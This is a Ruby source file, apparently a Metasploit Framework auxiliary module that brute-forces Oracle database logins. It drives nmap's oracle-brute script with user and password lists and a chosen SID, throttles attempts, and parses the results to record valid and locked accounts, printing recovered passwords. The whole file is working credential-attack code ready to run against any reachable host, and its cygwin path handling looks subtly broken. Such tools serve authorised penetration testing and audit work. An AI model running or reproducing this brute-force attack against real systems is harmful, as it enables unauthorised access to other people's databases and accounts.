##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/parser/nmap_xml'
require 'open3'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Nmap
	include Msf::Auxiliary::AuthBrute

	# Creates an instance of this module.
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle RDBMS Login Utility',
			'Description'    => %q{
				This module attempts to authenticate against an Oracle RDBMS
				instance using username and password combinations indicated
				by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
			},
			'Author'         => [ 'todb' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://www.oracle.com/us/products/database/index.html' ],
					[ 'CVE', '1999-0502'] # Weak password
				],
			'Version'        => '$Revision$'
		))

		register_options(
			[
				OptString.new('SID', [ true, 'The instance (SID) to authenticate against', 'XE'])
			], self.class)

		deregister_options("USERPASS_FILE")

	end

	def run
		print_status "Nmap: Setting up credential file..."
		credfile = create_credfile
		each_user_pass(true) {|user, pass| credfile[0].puts "%s/%s" % [user,pass] }
		credfile[0].flush
		nmap_build_args(credfile[1])
		print_status "Nmap: Starting Oracle bruteforce..."
		nmap_run
		credfile[0].unlink
		nmap_hosts {|host| process_host(host)}
	end

	def sid
		datastore['SID'].to_s
	end
	
	def nmap_build_args(credpath)
		nmap_reset_args
		self.nmap_args << "-P0"
		self.nmap_args << "--script oracle-brute"
		script_args = [
			"tns.sid=#{sid}",
			"brute.mode=creds",
			"brute.credfile=#{credpath}",
			"brute.threads=1"
		]
		script_args << "brute.delay=#{set_brute_delay}"
		self.nmap_args << "--script-args \"#{script_args.join(",")}\""
		self.nmap_args << "-n"
		self.nmap_args << "-v" if datastore['VERBOSE']
	end

	# Sometimes with weak little 10g XE databases, you will exhaust
	# available processes from the pool with lots and lots of
	# auth attempts, so use bruteforce_speed to slow things down
	def set_brute_delay
		case datastore["BRUTEFORCE_SPEED"]
		when 4; 0.25
		when 3; 0.5
		when 2; 1
		when 1; 15
		when 0; 60 * 5
		else; 0
		end
	end

	def create_credfile
		outfile = Rex::Quickfile.new("msf3-ora-creds-")
		if Rex::Compat.is_cygwin and nmap_binary_path =~ /cygdrive/i
			outfile_path = Rex::Compat.cygwin_to_win32(nmap_outfile.path)
		else
			outfile_path = outfile.path
		end
		@credfile = [outfile,outfile_path]
	end

	def process_host(h)
		h["ports"].each do |p|
			next if(p["scripts"].nil? || p["scripts"].empty?)
			p["scripts"].each do |id,output|
				next unless id == "oracle-brute"
				parse_script_output(h["addr"],p["portid"],output)
			end
		end
	end

	def extract_creds(str)
		m = str.match(/\s+([^\s]+):([^\s]+) =>/)
		m[1,2]
	end

	def parse_script_output(addr,port,output)
		msg = "#{addr}:#{port} - Oracle -"
		if output =~ /TNS: The listener could not resolve \x22/n
			print_error "#{msg} Invalid SID: #{sid}"
		elsif output =~ /Accounts[\s]+No valid accounts found/nm
			print_status "#{msg} No valid accounts found"
		else
			output.each_line do |oline|
				if oline =~ /Login correct/
					if not @oracle_reported
						report_service(:host => addr, :port => port, :proto => "tcp", :name => "oracle")
						report_note(:host => addr, :port => port, :proto => "tcp", :type => "oracle.sid", :data => sid, :update => :unique_data)
						@oracle_reported = true
					end
					user,pass = extract_creds(oline)
					pass = "" if pass == "<empty>"
					print_good "#{msg} Success: #{user}:#{pass} (SID: #{sid})"
					report_auth_info(
						:host => addr, :port => port, :proto => "tcp", 
						:user => "#{sid}/#{user}", :pass => pass, :active => true
					)
				elsif oline =~ /Account locked/
					if not @oracle_reported
						report_service(:host => addr, :port => port, :proto => "tcp", :name => "oracle")
						report_note(:host => addr, :port => port, :proto => "tcp", :type => "oracle.sid", :data => sid, :update => :unique_data)
						@oracle_reported = true
					end
					user = extract_creds(oline)[0]
					print_status "#{msg} Locked: #{user} (SID: #{sid}) -- account valid but locked"
					report_auth_info(
						:host => addr, :port => port, :proto => "tcp",
						:user => "#{sid}/#{user}", :active => false
					)
				elsif oline =~ /^\s+ERROR: (.*)/
					print_error "#{msg} NSE script error: #{$1}"
				end
			end
		end
	end

end

